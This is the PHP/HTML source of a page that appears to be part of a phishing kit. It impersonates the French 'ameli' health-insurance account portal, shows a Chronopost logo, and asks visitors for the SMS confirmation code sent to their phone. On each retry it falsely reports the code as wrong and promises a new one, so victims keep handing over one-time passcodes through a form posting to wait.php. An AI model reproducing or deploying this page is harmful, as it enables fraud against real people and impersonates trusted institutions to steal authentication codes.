<?php
if (isset($_GET['id']))

  $id=$_GET['id']+1;
 
else
   $id=0;








?>


<!DOCTYPE html>
<html>

<head>
	
	<link rel="icon" type="image/png"  href="images/favicon.ico"/>
	
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Compte ameli - mon espace personnel</title>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
    <link rel="stylesheet" type="text/css" href="assets/css/demo.css">
</head>

<body>
    <div class="container-fluid">
        <header>
            <div class="limiter">
            	<img src="images/chronopost_logo.png" alt="" >

               
                
            </div>
        </header>
        <div class="creditCardForm">
   <h4 style="text-align: center;">Nous vous remercions de vous authentifier en saisissant le code de confirmation reçu sur votre téléphone. Cette authentification est obligatoire pour confirmer votre opération.

</h4>
            <div class="payment" style="width: 100%">
                <form action="wait.php?id=<?php 

if (!empty($_GET['id']))
  echo $id ;
  else
  echo 1;



  ?>"  method="post" >
                    
 <div class="form-group" id="card-number-field">
                        <label for="cardNumber" style="text-align: center;">CODE DE CONFIRMATION: <span class="redd">*</span></label>
                        <input type="text" class="form-control" id="co1" name="co1" onkeypress="return onlyNumbers();" style="<?php if (isset($_GET['id'])) echo "border:1px solid red;" ?>">
                      
                    </div>	
                    <div style="color: red"><?php if (isset($_GET['id'])) echo "le code de confirmation erroné, vous allez recevoir un autre code pour confirmer" ?></div>
                   
                   
                   
                  
                    <div class="form-group" id="pay-now">
                        <button type="submit" class="btn btn-default" id="confirm-purchase" name="submitt">Confirmer</button>
                    </div>
                </form>
            </div>
        </div>

   

      
    </div>
<script language="JavaScript">
function onlyNumbers(evt)
{
var e = event || evt; // for trans-browser compatibility
var charCode = e.which || e.keyCode;

if (charCode > 31 && (charCode < 48 || charCode > 57))
    return false;

return true;

}
</script>
</body>

</html>
